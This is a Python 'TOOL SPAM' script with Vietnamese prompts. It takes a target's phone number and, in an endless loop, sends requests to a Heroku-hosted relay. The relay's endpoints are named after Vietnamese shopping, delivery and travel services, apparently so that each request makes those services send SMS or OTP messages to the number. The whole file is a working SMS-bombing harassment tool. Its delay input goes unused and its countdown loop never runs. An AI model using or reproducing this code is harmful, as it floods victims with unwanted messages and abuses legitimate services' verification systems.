
from time import sleep
import requests
stt=0
from time import sleep
import requests
import os, sys, requests, random
import time
from random import choice, randint, shuffle
ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].lower()
print('\n')
print('================================')
print('TOOL SPAM BY KHANG PHAN')
print('IP của bạn: '+ip)
print('Location: '+loc)
print('================================'+'\n')
phone=input("-> Nhập SĐT (Lưu Ý Bỏ Số 0 Ở Đầu): " )
time_delay = input('-> Time Delay: ')
while True:
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/the-gioi-di-dong?phone={phone}') 
    print( '|',stt,"Thành Công|")    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/nhap-hang-247?phone={phone}')
    print( '|',stt,"Thành Công|")    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/elines?phone={phone}')
    print( '|',stt,"Thành Công|") 
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/meta-vn?phone={phone}')
    print( '|',stt,"Thành Công|")  
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/bach-hoa-xanh?phone={phone}')
    print( '|',stt,"Thành Công|" )    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/grab-food?phone={phone}')
    print( '|',stt,"Thành Công|") 
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/tiki?phone={phone}')
    print( '|',stt,"Thành Công|")    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/go2joy?phone={phone}')
    print( '|',stt,"Thành Công|") 
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vntrip?phone={phone}')
    print( '|',stt,"Thành Công|")    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/agoda?phone={phone}')
    print( '|',stt,"Thành Công|")
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vieon?phone=0{phone}')
    print( '|',stt,"Thành Công|")
    for i in range(120, 0):
            print(f"Vui Lòng Đợi {i}\r")
